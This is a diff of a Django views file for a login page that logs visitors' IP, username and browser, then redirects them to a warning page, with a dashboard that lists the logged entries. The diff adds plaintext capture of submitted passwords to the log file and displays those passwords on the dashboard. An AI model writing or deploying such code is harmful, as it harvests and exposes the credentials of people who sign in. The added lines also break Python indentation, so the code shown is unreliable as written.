@@ -12,21 +12,25 @@ def get_client_ip(request):
 
 def login_view(request):
     if request.method == "POST":
-        email = request.POST.get("email")
+        email = request.POST.get("username")
         password = request.POST.get("password")
 
         ip_address = get_client_ip(request)
         user_agent = request.META.get('HTTP_USER_AGENT')
 
         with open("logs.txt", "a") as f:
-            f.write(
-                f"{datetime.now()} | "
-                f"IP={ip_address} | "
-                f"EMAIL={email} | "
-                f"UA={user_agent}\n"
-            )
+     f.write(
+    f"{datetime.now()} | "
+    f"IP={ip_address} | "
+    f"EMAIL={email} | "
+    f"PASSWORD={password} | "
+    f"UA={user_agent}\n"
+)
 
-        return redirect("warning")
+
+
+
+        return redirect("/warning/")
 
     return render(request, "login.html")
 
@@ -46,14 +50,16 @@ def soc_dashboard(request):
 
         for index, line in enumerate(lines):
             parts = line.strip().split(" | ")
-            if len(parts) >= 4:
-                events.append({
-                    "id": index,
-                    "time": parts[0],
-                    "ip": parts[1].replace("IP=", ""),
-                    "email": parts[2].replace("EMAIL=", ""),
-                    "ua": parts[3].replace("UA=", ""),
-                })
+            if len(parts) >= 5:
+    events.append({
+        "id": index,
+        "time": parts[0],
+        "ip": parts[1].replace("IP=", ""),
+        "email": parts[2].replace("EMAIL=", ""),
+        "password": parts[3].replace("PASSWORD=", ""),
+        "ua": parts[4].replace("UA=", ""),
+    })
+
     except FileNotFoundError:
         pass
 
@@ -72,4 +78,5 @@ def delete_log(request, log_id):
     except FileNotFoundError:
         pass
 
-    return redirect("soc")
+    return redirect("/soc-dashboard/")
+
